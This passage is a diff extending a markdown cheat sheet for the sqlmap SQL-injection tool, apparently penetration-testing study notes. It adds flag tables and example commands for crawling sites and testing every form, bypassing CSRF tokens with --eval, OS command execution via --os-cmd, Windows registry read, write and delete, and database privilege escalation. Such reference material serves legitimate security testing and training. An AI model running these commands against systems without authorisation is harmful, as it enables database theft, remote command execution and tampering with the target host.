@@ -27,6 +27,23 @@
 
 ## 🔑 Flags you must know cold
 
+### Target discovery extras
+| Flag | Meaning |
+|---|---|
+| `--crawl <depth>` | **Crawl** the site to depth N and test every URL / form found |
+| `--forms` | **Auto-detect HTML forms** and test each input |
+| `--wizard` | Beginner-friendly interactive Q&A walk-through (no flags to memorize) |
+| `-g "google dork"` | Seed targets from a Google search |
+| `--eval="<py>"` | Run Python **per-request** to mutate params (anti-CSRF, sign, hash) |
+| `--parse-errors` | Parse DB error messages (extra info leak) |
+| `--skip-urlencode` | Don't URL-encode payloads |
+
+Example `--eval` for a CSRF-token app:
+```bash
+sqlmap -u "https://app/form" --data "token=x&id=1" -p id \
+  --eval "import hashlib; token=hashlib.md5(str(id).encode()).hexdigest()" --batch
+```
+
 ### Target
 | Flag | Meaning |
 |---|---|
@@ -77,6 +94,12 @@
 | `--file-write=<local>` `--file-dest=<remote>` | Upload a file |
 | `--sql-shell` | Interactive SQL prompt |
 | `--sql-query "SELECT..."` | One-shot SQL |
+| `--roles` | Enumerate DB user roles (Oracle/MSSQL) |
+| `--os` | Report the remote **operating system** |
+| `--reg-read` `--reg-key` `--reg-value` | Read Windows registry (MSSQL xp_regread) |
+| `--reg-write` | Write to Windows registry |
+| `--reg-del` | Delete a registry key |
+| `--priv-esc` | Attempt DB privilege escalation |
 
 ### WAF bypass / tamper
 | Flag | Meaning |
@@ -157,6 +180,26 @@ sqlmap -u "http://<IP>/item.php?id=1" --technique=T --batch
 
 # 12. Proxy through Burp
 sqlmap -u "http://<IP>/item.php?id=1" --proxy http://127.0.0.1:8080 --batch
+
+# 13. Load raw request from Burp (handles complex auth / CSRF)
+sqlmap -r req.txt --batch --dbs
+
+# 14. Crawl entire site, test every form found
+sqlmap -u "http://<IP>/" --crawl=3 --forms --batch
+
+# 15. Beginner interactive mode
+sqlmap --wizard
+
+# 16. OS info + DBA roles
+sqlmap -u "http://<IP>/item.php?id=1" --os --roles --batch
+
+# 17. Blind OS command via stacked queries
+sqlmap -u "http://<IP>/item.php?id=1" --os-cmd="id" --batch
+
+# 18. Windows registry read (MSSQL targets)
+sqlmap -u "http://<IP>/item.php?id=1" --reg-read \
+  --reg-key="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" \
+  --reg-value="ProductName" --batch
 ```
 
 ---
